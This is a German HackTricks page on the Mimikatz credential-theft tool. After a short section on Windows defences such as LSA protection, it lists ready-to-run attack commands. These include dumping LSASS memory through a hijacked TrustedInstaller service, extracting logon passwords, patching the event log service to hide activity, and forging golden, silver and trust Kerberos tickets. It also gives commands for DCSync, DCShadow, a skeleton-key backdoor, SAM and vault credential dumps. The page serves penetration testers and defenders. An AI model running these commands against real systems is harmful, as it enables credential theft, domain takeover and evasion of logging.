# Mimikatz

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

**Diese Seite basiert auf einer Seite von [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Überprüfen Sie das Original für weitere Informationen!

## LM- und Klartext im Speicher

Ab Windows 8.1 und Windows Server 2012 R2 wurden erhebliche Maßnahmen ergriffen, um sich gegen das Diebstahl von Anmeldeinformationen zu schützen:

- **LM-Hashes und Klartextpasswörter** werden nicht mehr im Speicher gespeichert, um die Sicherheit zu erhöhen. Eine spezifische Registrierungseinstellung, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, muss mit einem DWORD-Wert von `0` konfiguriert werden, um die Digest-Authentifizierung zu deaktivieren und sicherzustellen, dass "Klartext" -Passwörter nicht im LSASS zwischengespeichert werden.

- **LSA-Schutz** wird eingeführt, um den Local Security Authority (LSA)-Prozess vor unbefugtem Speicherlesen und Codeinjektion zu schützen. Dies wird erreicht, indem der LSASS als geschützter Prozess markiert wird. Die Aktivierung des LSA-Schutzes umfasst:
1. Ändern der Registrierung unter _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, indem `RunAsPPL` auf `dword:00000001` gesetzt wird.
2. Implementierung eines Gruppenrichtlinienobjekts (GPO), das diese Registrierungsänderung auf verwalteten Geräten erzwingt.

Trotz dieser Schutzmaßnahmen können Tools wie Mimikatz den LSA-Schutz mithilfe spezifischer Treiber umgehen, obwohl solche Aktionen wahrscheinlich in Ereignisprotokollen aufgezeichnet werden.

### Gegenmaßnahmen zur Entfernung von SeDebugPrivilege

Administratoren haben in der Regel SeDebugPrivilege, um Programme zu debuggen. Dieses Privileg kann eingeschränkt werden, um unbefugte Speicherabbilder zu verhindern, eine häufig von Angreifern verwendete Technik, um Anmeldeinformationen aus dem Speicher zu extrahieren. Selbst wenn dieses Privileg entfernt wird, kann das TrustedInstaller-Konto weiterhin Speicherabbilder mithilfe einer angepassten Dienstkonfiguration erstellen:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dies ermöglicht das Dumpen des Speichers von `lsass.exe` in eine Datei, die dann auf einem anderen System analysiert werden kann, um Anmeldeinformationen zu extrahieren:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz-Optionen

Die Manipulation von Ereignisprotokollen in Mimikatz umfasst zwei Hauptaktionen: das Löschen von Ereignisprotokollen und das Patchen des Ereignisdienstes, um das Protokollieren neuer Ereignisse zu verhindern. Im Folgenden finden Sie die Befehle für diese Aktionen:

#### Löschen von Ereignisprotokollen

- **Befehl**: Diese Aktion zielt darauf ab, die Ereignisprotokolle zu löschen, um die Nachverfolgung von bösartigen Aktivitäten zu erschweren.
- Mimikatz bietet in seiner Standarddokumentation keinen direkten Befehl zum direkten Löschen von Ereignisprotokollen über die Befehlszeile. Die Manipulation von Ereignisprotokollen beinhaltet jedoch in der Regel die Verwendung von Systemtools oder Skripten außerhalb von Mimikatz, um bestimmte Protokolle zu löschen (z. B. mit PowerShell oder dem Windows-Ereignisbetrachter).

#### Experimentelle Funktion: Patchen des Ereignisdienstes

- **Befehl**: `event::drop`
- Dieser experimentelle Befehl ist darauf ausgelegt, das Verhalten des Ereignisprotokolldienstes zu ändern und so das Aufzeichnen neuer Ereignisse zu verhindern.
- Beispiel: `mimikatz "privilege::debug" "event::drop" exit`

- Der Befehl `privilege::debug` stellt sicher, dass Mimikatz mit den erforderlichen Berechtigungen zum Ändern von Systemdiensten arbeitet.
- Der Befehl `event::drop` patcht dann den Ereignisprotokolldienst.


### Kerberos-Ticket-Angriffe

### Erstellung eines Golden Tickets

Ein Golden Ticket ermöglicht die Impersonation von Zugriffen auf Domänenebene. Wichtige Befehle und Parameter:

- Befehl: `kerberos::golden`
- Parameter:
- `/domain`: Der Domänenname.
- `/sid`: Die Security Identifier (SID) der Domäne.
- `/user`: Der Benutzername, der imitiert werden soll.
- `/krbtgt`: Der NTLM-Hash des KDC-Dienstkontos der Domäne.
- `/ptt`: Injiziert das Ticket direkt in den Speicher.
- `/ticket`: Speichert das Ticket für die spätere Verwendung.

Beispiel:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Erstellung eines Silver Tickets

Silver Tickets gewähren Zugriff auf bestimmte Dienste. Wichtige Befehle und Parameter:

- Befehl: Ähnlich wie bei einem Golden Ticket, aber zielt auf bestimmte Dienste ab.
- Parameter:
- `/service`: Der zu zielende Dienst (z. B. cifs, http).
- Andere Parameter ähnlich wie bei einem Golden Ticket.

Beispiel:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Erstellung

Trust Tickets werden verwendet, um auf Ressourcen in verschiedenen Domänen zuzugreifen, indem Vertrauensbeziehungen ausgenutzt werden. Wichtige Befehle und Parameter:

- Befehl: Ähnlich wie ein Golden Ticket, jedoch für Vertrauensbeziehungen.
- Parameter:
- `/target`: Der vollqualifizierte Domänenname (FQDN) der Ziel-Domäne.
- `/rc4`: Der NTLM-Hash für das Vertrauenskonto.

Beispiel:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Zusätzliche Kerberos-Befehle

- **Auflisten von Tickets**:
- Befehl: `kerberos::list`
- Listet alle Kerberos-Tickets für die aktuelle Benutzersitzung auf.

- **Cache übergeben**:
- Befehl: `kerberos::ptc`
- Injiziert Kerberos-Tickets aus Cache-Dateien.
- Beispiel: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Ticket übergeben**:
- Befehl: `kerberos::ptt`
- Ermöglicht die Verwendung eines Kerberos-Tickets in einer anderen Sitzung.
- Beispiel: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Tickets löschen**:
- Befehl: `kerberos::purge`
- Löscht alle Kerberos-Tickets aus der Sitzung.
- Nützlich vor der Verwendung von Befehlen zur Ticketmanipulation, um Konflikte zu vermeiden.


### Manipulation von Active Directory

- **DCShadow**: Lässt eine Maschine vorübergehend als DC agieren, um AD-Objektmanipulationen durchzuführen.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Ahmt einen DC nach, um Passwortdaten anzufordern.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Zugriff auf Anmeldeinformationen

- **LSADUMP::LSA**: Extrahiert Anmeldeinformationen aus LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Gibt vor, ein DC zu sein, indem die Passwortdaten eines Computerkontos verwendet werden.
- *Kein spezifischer Befehl für NetSync im ursprünglichen Kontext angegeben.*

- **LSADUMP::SAM**: Zugriff auf lokale SAM-Datenbank.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Entschlüsselt im Registrierungsspeicher gespeicherte Secrets.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Setzt einen neuen NTLM-Hash für einen Benutzer.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ruft Authentifizierungsinformationen für Vertrauensstellungen ab.
- `mimikatz "lsadump::trust" exit`

### Sonstiges

- **MISC::Skeleton**: Injiziert eine Hintertür in LSASS auf einem DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Erwerben von Backup-Rechten.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Erlangen von Debug-Privilegien.
- `mimikatz "privilege::debug" exit`

### Anmeldeinformationen auslesen

- **SEKURLSA::LogonPasswords**: Zeigt Anmeldeinformationen für angemeldete Benutzer an.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extrahiert Kerberos-Tickets aus dem Speicher.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid- und Token-Manipulation

- **SID::add/modify**: Ändert SID und SIDHistory.
- Hinzufügen: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Ändern: *Kein spezifischer Befehl für Ändern im ursprünglichen Kontext angegeben.*

- **TOKEN::Elevate**: Übernimmt Tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminaldienste

- **TS::MultiRDP**: Erlaubt mehrere RDP-Sitzungen.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Listet TS/RDP-Sitzungen auf.
- *Kein spezifischer Befehl für TS::Sessions im ursprünglichen Kontext angegeben.*

### Tresor

- Extrahiert Passwörter aus dem Windows-Tresor.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
